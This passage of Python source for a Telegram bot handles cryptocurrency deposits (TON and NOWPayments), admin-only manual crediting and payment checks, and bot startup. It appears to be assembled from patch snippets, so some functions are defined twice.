        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"⚠️ **Manual Credit Confirmation**\n\n"
            f"**Transaction ID:** `{transaction_id}`\n"
            f"**User ID:** `{transaction['user_id']}`\n"
            f"**Amount:** `${transaction['amount']:.2f}`\n"
            f"**Payment Method:** `{transaction['payment_method']}`\n"
            f"**Status:** `{transaction['status']}`\n"
            f"**Memo:** `{transaction.get('payment_id', 'N/A')}`\n\n"
            f"⚠️ This will immediately credit ${transaction['amount']:.2f} to user {transaction['user_id']}\n\n"
            f"**Make sure you verified the payment was received!**",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Error in admin_credit_ton_manual: {e}")
        import traceback
        traceback.print_exc()
        await update.message.reply_text(f"❌ Error: {str(e)}")


async def handle_admin_credit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin credit confirmation callback"""
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != config.OWNER_ID:
        await query.answer("❌ Unauthorized", show_alert=True)
        return
    
    if query.data == 'admin_cancel':
        await query.edit_message_text("❌ Cancelled - No changes made")
        return
    
    if query.data.startswith('admin_credit_confirm_'):
        transaction_id = query.data.replace('admin_credit_confirm_', '')
        
        try:
            from bson.objectid import ObjectId
            
            database = get_db()
            
            # Get transaction
            obj_id = ObjectId(transaction_id)
            transaction = database.transactions.find_one({'_id': obj_id})
            
            if not transaction:
                await query.edit_message_text("❌ Transaction not found")
                return
            
            if transaction['status'] == 'completed':
                await query.edit_message_text("⚠️ Already credited!")
                return
            
            # Credit user balance
            success = User.update_balance(
                transaction['user_id'], 
                transaction['amount'], 
                operation='add'
            )
            
            if not success:
                await query.edit_message_text("❌ User not found")
                return
            
            # Update transaction status
            Transaction.update_status(
                obj_id,
                'completed',
                charge_id=f'MANUAL_ADMIN_{query.from_user.id}'
            )
            
            # Get updated user
            user = User.get_by_telegram_id(transaction['user_id'])
            new_balance = user['balance'] if user else 0.0
            
            await query.edit_message_text(
                f"✅ **Payment Manually Credited!**\n\n"
                f"**Transaction:** `{transaction_id}`\n"
                f"**User:** `{transaction['user_id']}`\n"
                f"**Amount:** `${transaction['amount']:.2f}`\n"
                f"**New Balance:** `${new_balance:.2f}`\n\n"
                f"User will be notified.",
                parse_mode='Markdown'
            )
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=transaction['user_id'],
                    text=(
                        "✅ **Payment Verified!**\n\n"
                        f"💰 ${transaction['amount']:.2f} has been added to your balance.\n"
                        f"💳 New Balance: ${new_balance:.2f}\n\n"
                        "Thank you for your payment!"
                    ),
                    parse_mode='Markdown'
                )
                logger.info(f"✅ User {transaction['user_id']} notified of manual credit")
            except Exception as e:
                logger.error(f"Could not notify user: {e}")
            
        except Exception as e:
            logger.error(f"Error in handle_admin_credit_callback: {e}")
            import traceback
            traceback.print_exc()
            await query.edit_message_text(f"❌ Error: {str(e)}")

async def cancel_custom_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel custom deposit - FIXED"""
    # Clear ALL deposit-related context
    context.user_data.clear()
    
    keyboard = [
        [InlineKeyboardButton("💳 Deposit", callback_data='deposit')],
        [InlineKeyboardButton("📋 Main Menu", callback_data='back_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "❌ Operation cancelled.",
        reply_markup=reply_markup
    )
    return ConversationHandler.END


# ============================================================
# TON Payment Functions
# ============================================================

async def show_ton_deposit_options(query):
    """Show TON deposit amount options"""
    # ✅ Get fresh minimum deposit
    min_deposit = get_min_deposit()
    
    # Build keyboard with amounts >= minimum
    keyboard = []
    
    amounts = [5, 10, 25, 50, 100]
    for amount in amounts:
        if amount >= min_deposit:
            keyboard.append([InlineKeyboardButton(f"${amount} USD", callback_data=f'ton_deposit_{amount}')])
    
    keyboard.append([InlineKeyboardButton("💵 Custom Amount", callback_data='custom_deposit_ton')])
    keyboard.append([InlineKeyboardButton("« Back", callback_data='deposit')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "💎 TON Deposit\n\n"
        f"Minimum: ${min_deposit:.2f} USD\n\n"
        "Choose an amount to deposit.\n"
        "You'll receive a TON wallet address to send payment.",
        reply_markup=reply_markup
    )

# ============================================
# COPY-PASTE THIS FUNCTION
# Replace show_crypto_manual_amount in bot.py (around line 2125)
# ============================================

async def show_crypto_manual_amount(query, crypto_type):
    """Show amount selection - NOWPayments version"""
    if crypto_type.startswith('crypto_now_'):
        crypto_type = crypto_type.replace('crypto_now_', '')
    
    min_deposit = get_min_deposit()
    
    keyboard = []
    
    amounts = [5, 10, 25, 100]
    
    for amount in amounts:
        if amount >= min_deposit:
            keyboard.append([InlineKeyboardButton(
                f"${amount} USD",
                callback_data=f'crypto_now_pay_{crypto_type}_{amount}'
            )])
    
    # ✅ FIXED: Changed crypto_manual_custom_ to crypto_now_custom_
    keyboard.append([InlineKeyboardButton("💬 Custom Amount", callback_data=f'crypto_now_custom_{crypto_type}')])
    keyboard.append([InlineKeyboardButton("« Back", callback_data='deposit_crypto_manual')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    crypto_name = get_currency_display_name(crypto_type)
    
    await query.edit_message_text(
        f"💰 **{crypto_name} Deposit**\n\n"
        f"Minimum: ${min_deposit:.2f}\n"
        f"✅ Automatic verification\n"
        f"✅ Instant credit after confirmation\n\n"
        "Select amount or choose custom:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def show_crypto_manual_selection(query):
    """Show crypto selection - NOWPayments version - NO MARKDOWN"""
    keyboard = [
        [
            InlineKeyboardButton("₿ Bitcoin", callback_data='crypto_now_btc'),
            InlineKeyboardButton("Ξ Ethereum", callback_data='crypto_now_eth')
        ],
        [
            InlineKeyboardButton("💵 USDT (Tron)", callback_data='crypto_now_usdttrc20'),
            InlineKeyboardButton("💵 USDT (ETH)", callback_data='crypto_now_usdterc20')
        ],
        [
            InlineKeyboardButton("💵 USDT (BSC)", callback_data='crypto_now_usdtbep20'),
            InlineKeyboardButton("◎ Solana", callback_data='crypto_now_sol')
        ],
        [
            InlineKeyboardButton("🔶 BNB", callback_data='crypto_now_bnb'),
            InlineKeyboardButton("⚡ Tron", callback_data='crypto_now_trx')
        ],
        [
            InlineKeyboardButton("Ł Litecoin", callback_data='crypto_now_ltc'),
            InlineKeyboardButton("🐕 Dogecoin", callback_data='crypto_now_doge')
        ],
        [InlineKeyboardButton("« Back", callback_data='deposit')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "💰 Select Cryptocurrency\n\n"
        "✅ Fast confirmation (1-30 minutes)\n"
        "✅ Automatic verification\n\n"
        "Choose your preferred crypto:",
        reply_markup=reply_markup
    )


# FUNCTION 2: show_crypto_manual_amount (line ~2125)
async def show_crypto_manual_amount(query, crypto_type):
    """Show amount selection - NOWPayments version"""
    # Remove crypto_now_ prefix if present
    if crypto_type.startswith('crypto_now_'):
        crypto_type = crypto_type.replace('crypto_now_', '')
    
    # ✅ ENSURE LOWERCASE
    crypto_type = crypto_type.lower()
    
    min_deposit = get_min_deposit()
    
    keyboard = []
    
    amounts = [5, 10, 25, 100]
    
    for amount in amounts:
        if amount >= min_deposit:
            keyboard.append([InlineKeyboardButton(
                f"${amount} USD",
                callback_data=f'crypto_now_pay_{crypto_type}_{amount}'
            )])
    
    keyboard.append([InlineKeyboardButton("💬 Custom Amount", callback_data=f'crypto_now_custom_{crypto_type}')])
    keyboard.append([InlineKeyboardButton("« Back", callback_data='deposit_crypto_manual')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    crypto_name = get_currency_display_name(crypto_type)
    
    await query.edit_message_text(
        f"💰 {crypto_name} Deposit\n\n"
        f"Minimum: ${min_deposit:.2f}\n"
        f"✅ Automatic verification\n"
        f"✅ Instant credit after confirmation\n\n"
        "Select amount or choose custom:",
        reply_markup=reply_markup
    )


# FUNCTION 3: process_crypto_manual_deposit (line ~2159)
async def process_crypto_manual_deposit(query, crypto_type, amount_usd):
    """Process NOWPayments deposit - FIXED with monospace address"""
    # Remove prefix if present
    if crypto_type.startswith('crypto_now_'):
        crypto_type = crypto_type.replace('crypto_now_', '')
    
    # ✅ CRITICAL: Always lowercase
    crypto_type = crypto_type.lower()
    
    user_id = query.from_user.id
    
    await query.edit_message_text("⏳ Creating payment...")
    
    result = create_nowpayment(user_id, amount_usd, crypto_type)
    
    if not result or not result.get('success'):
        await query.edit_message_text(
            "❌ Error creating payment.\n\n"
            "Please try again or contact support."
        )
        return
    
    crypto_name = get_currency_display_name(crypto_type)
    
    keyboard = []
    
    if 'payment_url' in result:
        keyboard.append([InlineKeyboardButton("💳 Open Payment Page", url=result['payment_url'])])
    
    keyboard.append([InlineKeyboardButton("🔄 Check Payment Status", callback_data=f'check_now_{result["transaction_id"]}')])
    keyboard.append([InlineKeyboardButton("« Main Menu", callback_data='back_menu')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # ✅ FIXED: Build message as string with proper formatting
    message = (
        f"💰 **{crypto_name} Payment**\n\n"
        f"**Amount:** ${amount_usd:.2f} USD\n"
        f"**Pay:** {result['pay_amount']} {result['pay_currency']}\n\n"
        f"**Address:**\n"
        f"`{result['pay_address']}`\n\n"  # ✅ Monospace for easy copying
    )
    
    # Add instructions based on whether payment URL exists
    if 'payment_url' in result:
        message += (
            "**Steps:**\n"
            "1. Click 'Open Payment Page'\n"
            "2. Send the exact amount shown\n"
            "3. Wait for confirmation (1-30 min)\n"
            "4. Balance credited automatically!\n\n"
        )
    else:
        message += (
            "**Steps:**\n"
            "1. Copy the address above\n"
            "2. Send exactly the amount shown\n"
            "3. Wait for confirmation (1-30 min)\n"
            "4. Balance credited automatically!\n\n"
        )
    
    message += (
        "✅ Automatic verification\n"
        "⏰ Expires in 1 hour"
    )
    
    await query.edit_message_text(
        message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def receive_crypto_manual_custom_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive custom crypto manual amount - NEW FUNCTION"""
    try:
        amount = float(update.message.text.strip())
        
        # Get minimum deposit from admin settings
        min_deposit = get_min_deposit()
        
        logger.info(f"💰 Crypto manual custom amount entered: ${amount}, Min: ${min_deposit}")
        
        if amount < min_deposit:
            await update.message.reply_text(
                f"❌ Minimum deposit is ${min_deposit:.2f} USD\n\n"
                f"Please enter ${min_deposit:.2f} or more."
            )
            return CUSTOM_DEPOSIT  # Keep in same state
        
        # Get crypto type from context
        crypto_type = context.user_data.get('crypto_manual_type')
        
        if not crypto_type:
            await update.message.reply_text("❌ Session expired. Please start again.")
            return ConversationHandler.END
        
        # Create a fake query object to reuse process_crypto_manual_deposit
        class FakeQuery:
            def __init__(self, message, user):
                self.message = message
                self.from_user = user
            
            async def edit_message_text(self, text, **kwargs):
                await self.message.reply_text(text, **kwargs)
            
            async def answer(self, *args, **kwargs):
                pass
        
        fake_query = FakeQuery(update.message, update.effective_user)
        
        # Clear context
        context.user_data.pop('crypto_manual_type', None)
        
        # Process deposit
        await process_crypto_manual_deposit(fake_query, crypto_type, amount)
        
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid amount. Please enter a number.\n\n"
            "Example: 15"
        )
        return CUSTOM_DEPOSIT
    except Exception as e:
        logger.error(f"Error in receive_crypto_manual_custom_amount: {e}")
        import traceback
        traceback.print_exc()
        await update.message.reply_text("❌ Error occurred. Please try again.")
        return ConversationHandler.END

"""
FIXES FOR TON PAYMENT CHECK
Replace these functions in bot.py
"""

# ============================================================================
# FIX 1: Replace check_ton_payment() function in bot.py (around line 1150)
# ============================================================================

async def check_ton_payment(query, transaction_id):
    """Check TON payment status - FIXED FOR MONGODB ObjectId"""
    if not TON_AVAILABLE:
        await query.answer("TON payments unavailable", show_alert=True)
        return
        
    await query.answer("⏳ Checking...", show_alert=False)
    await query.edit_message_text("⏳ Verifying payment...")
    
    try:
        ton_handler = get_ton_payment()
        
        # ✅ FIX: transaction_id is already a STRING (MongoDB ObjectId)
        # Don't convert to int!
        logger.info(f"🔍 Checking TON payment for transaction: {transaction_id}")
        
        success = await ton_handler.verify_and_credit_payment(transaction_id)
        
        if success:
            # Get updated user balance
            user = User.get_by_telegram_id(query.from_user.id)
            balance = user['balance'] if user else 0.0
            
            keyboard = [[InlineKeyboardButton("« Menu", callback_data='back_menu')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"✅ Payment Verified!\n\n"
                f"💰 Balance: ${balance:.2f}\n\n"
                f"Thank you!",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            keyboard = [
                [InlineKeyboardButton("🔄 Check Again", callback_data=f'ton_check_{transaction_id}')],
                [InlineKeyboardButton("« Menu", callback_data='back_menu')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                "⏳ Not Yet Received\n\n"
                "Wait 1-2 minutes for confirmation.\n"
                "Make sure you included the memo!",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"❌ Check payment error: {e}")
        import traceback
        traceback.print_exc()
        
        keyboard = [[InlineKeyboardButton("« Menu", callback_data='back_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "❌ Error checking payment.\n\n"
            "Please try again or contact support.",
            reply_markup=reply_markup
        )


# ============================================================================
# FIX 2: Replace process_ton_deposit() to store ObjectId as string
# Around line 1050 in bot.py
# ============================================================================

async def check_nowpayment_status(query, transaction_id):
    """Check NOWPayments payment status - NO MARKDOWN"""
    await query.answer("🔄 Checking...", show_alert=False)
    await query.edit_message_text("⏳ Verifying payment...")
    
    try:
        success = check_payment_manually(transaction_id)
        
        if success:
            user = User.get_by_telegram_id(query.from_user.id)
            balance = user['balance'] if user else 0.0
            
            keyboard = [[InlineKeyboardButton("« Menu", callback_data='back_menu')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                "✅ Payment Verified!\n\n"
                f"💰 Balance: ${balance:.2f}\n\n"
                f"Thank you!",
                reply_markup=reply_markup
            )
        else:
            keyboard = [
                [InlineKeyboardButton("🔄 Check Again", callback_data=f'check_now_{transaction_id}')],
                [InlineKeyboardButton("« Menu", callback_data='back_menu')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                "⏳ Not Yet Confirmed\n\n"
                "Wait 1-2 minutes for blockchain confirmation.\n"
                "Make sure you sent the exact amount!",
                reply_markup=reply_markup
            )
    except Exception as e:
        logger.error(f"Error checking payment: {e}")
        await query.edit_message_text("❌ Error checking payment. Please try again.")

async def process_ton_deposit(query, user_id, amount):
    """Process TON deposit request - FIXED FOR MONGODB"""
    # ✅ Get fresh minimum deposit
    min_deposit = get_min_deposit()
    
    logger.info(f"💎 TON Deposit: ${amount}, Min: ${min_deposit}")
    
    if amount < min_deposit:
        await query.edit_message_text(
            f"❌ Minimum deposit is ${min_deposit:.2f} USD\n\n"
            "Please select a higher amount."
        )
        return
    
    if not TON_AVAILABLE:
        await query.edit_message_text("❌ TON payments are currently unavailable.")
        return
        
    await query.edit_message_text("⏳ Generating TON payment address...")
    
    try:
        ton_handler = get_ton_payment()
        payment_info = ton_handler.create_deposit_address(user_id, amount)
        
        if not payment_info.get('success'):
            await query.edit_message_text(
                "❌ Error creating payment. Please try again later."
            )
            return
        
        # ✅ FIX: transaction_id is already a STRING from MongoDB
        transaction_id = payment_info['transaction_id']
        logger.info(f"✅ Created TON payment with transaction ID: {transaction_id}")
        
        # Generate QR code
        try:
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(payment_info['wallet_address'])
            qr.make(fit=True)
            qr_img = qr.make_image(fill_color="black", back_color="white")
            
            qr_bytes = io.BytesIO()
            qr_img.save(qr_bytes, format='PNG')
            qr_bytes.seek(0)
            
            await query.message.reply_photo(
                photo=qr_bytes,
                caption=(
                    f"💎 **TON Payment**\n\n"
                    f"**Amount:** `{payment_info['amount_ton']:.2f} TON` (${payment_info['amount_usd']:.2f} USD)\n\n"
                    f"**Wallet:**\n`{payment_info['wallet_address']}`\n\n"
                    f"**MEMO (REQUIRED):**\n`{payment_info['memo']}`\n\n"
                    f"⚠️ You MUST include the memo!\n"
                    f"⏱ Expires in 1 hour"
                ),
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"QR code error: {e}")
        
        # ✅ FIX: Use string transaction_id in callback_data
        keyboard = [
            [InlineKeyboardButton("✅ I've Paid", callback_data=f'ton_check_{transaction_id}')],
            [InlineKeyboardButton("❌ Cancel", callback_data='back_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"💎 **TON Payment**\n\n"
            f"**Send:** `{payment_info['amount_ton']:.2f} TON`\n"
            f"**To:** `{payment_info['wallet_address']}`\n"
            f"**Memo:** `{payment_info['memo']}`\n\n"
            f"**Steps:**\n"
            f"1. Open your TON wallet\n"
            f"2. Send {payment_info['amount_ton']:.2f} TON\n"
            f"3. Add memo/comment shown above\n"
            f"4. Click 'I've Paid'\n\n"
            f"⏱ Expires in 1 hour",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"❌ TON deposit error: {e}")
        import traceback
        traceback.print_exc()
        await query.edit_message_text("❌ Error. Please try again.")


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors and notify user"""
    logger.error("Exception while handling an update:", exc_info=context.error)
    
    try:
        if isinstance(update, Update) and update.effective_message:
            await update.effective_message.reply_text(
                "❌ An error occurred while processing your request. "
                "Please try again or contact support if the issue persists."
            )
    except Exception as e:
        logger.error(f"Failed to send error message to user: {e}")

async def admin_verify_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to verify crypto payments"""
    user_id = update.effective_user.id
    
    if user_id != config.OWNER_ID:
        await update.message.reply_text("❌ Admin only")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /verify_crypto <transaction_id> <tx_hash>"
        )
        return
    
    transaction_id = context.args[0]
    tx_hash = context.args[1]
    
    try:
        from payment_crypto_manual import verify_crypto_payment
        from bson.objectid import ObjectId
        
        success = verify_crypto_payment(transaction_id, tx_hash)
        
        if success:
            transaction = Transaction.get_by_id(ObjectId(transaction_id))
            if transaction:
                await update.message.reply_text(
                    f"✅ Payment Verified!\n\n"
                    f"💰 ${transaction['amount']:.2f}\n"
                    f"👤 User: {transaction['user_id']}"
                )
                
                # Notify user
                try:
                    user_obj = User.get_by_telegram_id(transaction['user_id'])
                    if user_obj:
                        await context.bot.send_message(
                            transaction['user_id'],
                            f"✅ Payment verified: ${transaction['amount']:.2f}\n"
                            f"💳 Balance: ${user_obj['balance']:.2f}"
                        )
                except:
                    pass
        else:
            await update.message.reply_text("❌ Failed to verify payment")
    
    except Exception as e:
        logger.error(f"Error: {e}")
        await update.message.reply_text(f"❌ Error: {e}")


async def admin_pending_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show pending crypto payments"""
    user_id = update.effective_user.id
    
    if user_id != config.OWNER_ID:
        await update.message.reply_text("❌ Admin only")
        return
    
    try:
        
        time_limit = datetime.utcnow() - timedelta(hours=48)
        database = get_db()
        
        pending = list(database.transactions.find({
            'payment_method': 'crypto_manual',
            'status': 'pending',
            'created_at': {'$gte': time_limit}
        }).sort('created_at', -1).limit(20))
        
        if not pending:
            await update.message.reply_text("📭 No pending payments")
            return
        
        message = "💰 **Pending Crypto**\n\n"
        
        for idx, txn in enumerate(pending, 1):
            time_ago = datetime.utcnow() - txn['created_at']
            hours = int(time_ago.total_seconds() / 3600)
            
            message += f"{idx}. ${txn['amount']:.2f}\n"
            message += f"   User: `{txn['user_id']}`\n"
            message += f"   ID: `{str(txn['_id'])}`\n"
            message += f"   {hours}h ago\n\n"
        
        message += "Verify: `/verify_crypto <id> <tx_hash>`"
        
        await update.message.reply_text(message, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Error: {e}")
        await update.message.reply_text(f"❌ Error: {e}")


async def handle_admin_credit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin credit confirmations"""
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != config.OWNER_ID:
        await query.edit_message_text("❌ Admin only")
        return
    
    if query.data == 'admin_cancel':
        await query.edit_message_text("❌ Cancelled")
        return
    
    if query.data.startswith('admin_credit_confirm_'):
        transaction_id = query.data.replace('admin_credit_confirm_', '')
        
        try:
            from bson.objectid import ObjectId
            
            transaction = Transaction.get_by_id(ObjectId(transaction_id))
            
            if not transaction:
                await query.edit_message_text("❌ Not found")
                return
            
            if transaction['status'] == 'completed':
                await query.edit_message_text("✅ Already credited")
                return
            
            # Credit user
            User.update_balance(
                transaction['user_id'],
                transaction['amount'],
                operation='add'
            )
            
            Transaction.update_status(ObjectId(transaction_id), 'completed')
            
            user_obj = User.get_by_telegram_id(transaction['user_id'])
            
            await query.edit_message_text(
                f"✅ Credited!\n"
                f"💰 ${transaction['amount']:.2f}\n"
                f"👤 {transaction['user_id']}\n"
                f"💳 Balance: ${user_obj['balance']:.2f}"
            )
            
            # Notify user
            try:
                await context.bot.send_message(
                    transaction['user_id'],
                    f"✅ Payment received: ${transaction['amount']:.2f}\n"
                    f"💳 Balance: ${user_obj['balance']:.2f}"
                )
            except:
                pass
        
        except Exception as e:
            logger.error(f"Error: {e}")
            await query.edit_message_text(f"❌ Error: {e}")

def main():
    """Start the bot - FIXED VERSION FOR v20.7"""
    # Start web server
    keep_alive()
    
    logger.info("=" * 70)
    logger.info("🚀 STARTING TELEGRAM BOT")
    logger.info("=" * 70)
    
    # Test MongoDB connection FIRST
    try:
        from database import get_db
        db = get_db()
        logger.info("✅ MongoDB connected successfully")
    except Exception as e:
        logger.error(f"❌ CRITICAL: MongoDB connection failed: {e}")
        logger.error("Bot cannot start without database!")
        return
    
    # Test bot token
    try:
        import requests
        response = requests.get(f"https://api.telegram.org/bot{config.BOT_TOKEN}/getMe")
        if response.status_code == 200:
            bot_info = response.json()['result']
            logger.info(f"✅ Bot token valid: @{bot_info['username']}")
        else:
            logger.error(f"❌ CRITICAL: Invalid bot token!")
            return
    except Exception as e:
        logger.error(f"❌ CRITICAL: Cannot connect to Telegram: {e}")
        return
    
    # ✅ FIX: Build application with updater disabled
    try:
        application = (
            Application.builder()
            .token(config.BOT_TOKEN)
            .updater(None)  # ✅ DISABLE UPDATER
            .build()
        )
        logger.info("✅ Application created")
    except Exception as e:
        logger.error(f"❌ CRITICAL: Cannot create application: {e}")
        import traceback
        traceback.print_exc()
        return
    
    # Add error handler FIRST
    application.add_error_handler(error_handler)
    logger.info("✅ Error handler registered")
    
    # Initialize TON payment (optional)
    if TON_AVAILABLE and hasattr(config, 'TON_MASTER_WALLET') and config.TON_MASTER_WALLET:
        try:
            api_key = getattr(config, 'TON_API_KEY', None)
            init_ton_payment(config.TON_MASTER_WALLET, api_key)
            logger.info("✅ TON Payment initialized")
        except Exception as e:
            logger.warning(f"⚠️ TON initialization failed: {e}")
    
    logger.info("=" * 70)
    logger.info("📝 REGISTERING HANDLERS")
    logger.info("=" * 70)
    
    # Register all your handlers here (same as before)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel_custom_deposit))
    
    # Conversation handlers
    deposit_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(ask_custom_deposit, pattern='^custom_deposit_ton$'),
            CallbackQueryHandler(ask_custom_deposit, pattern='^custom_deposit_inr$'),
            CallbackQueryHandler(ask_custom_deposit, pattern='^crypto_now_custom_')
        ],
        states={
            CUSTOM_DEPOSIT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_custom_deposit)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel_custom_deposit)],
        allow_reentry=True
    )
    application.add_handler(deposit_conv)
    
    bulk_custom_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(bulk_custom_quantity_start, pattern='^bulk_custom_')
        ],
        states={
            BUY_BULK_CUSTOM_QUANTITY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_bulk_custom_quantity)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel_custom_deposit)],
        allow_reentry=True
    )
    application.add_handler(bulk_custom_conv)
    
    # Setup other handlers
    try:
        setup_admin_handlers(application)
        setup_leader_handlers(application)
        setup_seller_handlers(application)
        logger.info("✅ All handlers registered")
    except Exception as e:
        logger.error(f"❌ Handler registration error: {e}")
    
    # Admin commands
    application.add_handler(CommandHandler("pending_sellers", admin_pending_sellers))
    application.add_handler(CommandHandler("pending_withdrawals", admin_pending_withdrawals))
    application.add_handler(CommandHandler("pending_ton", admin_pending_ton))
    application.add_handler(CommandHandler("credit_ton", admin_credit_ton_manual))
    application.add_handler(CommandHandler("verify_crypto", admin_verify_crypto))
    application.add_handler(CommandHandler("pending_crypto", admin_pending_crypto))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(handle_admin_credit_callback, pattern='^admin_credit_confirm_'))
    application.add_handler(CallbackQueryHandler(handle_admin_credit_callback, pattern='^admin_cancel$'))
    application.add_handler(CallbackQueryHandler(button_callback), group=1)
    
    logger.info("=" * 70)
    logger.info("🚀 Starting bot with manual polling...")
    logger.info("=" * 70)
    
    # ✅ FIX: Initialize and run with manual update fetching
    async def start_bot():
        await application.initialize()
        await application.start()
        
        # Manual polling loop
        offset = 0
        while True:
            try:
                updates = await application.bot.get_updates(
                    offset=offset,
                    timeout=30,
                    allowed_updates=Update.ALL_TYPES
                )
                
                for update in updates:
                    offset = update.update_id + 1
                    await application.process_update(update)
                    
            except Exception as e:
                logger.error(f"Polling error: {e}")
                await asyncio.sleep(1)
    
    # Run the bot
    import asyncio
    try:
        asyncio.run(start_bot())
    except KeyboardInterrupt:
        logger.info("\n🛑 Bot stopped by user")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info("\n🛑 Bot stopped by user")
    except Exception as e:
        logger.error(f"❌ FATAL ERROR: {e}")
        import traceback
        traceback.print_exc()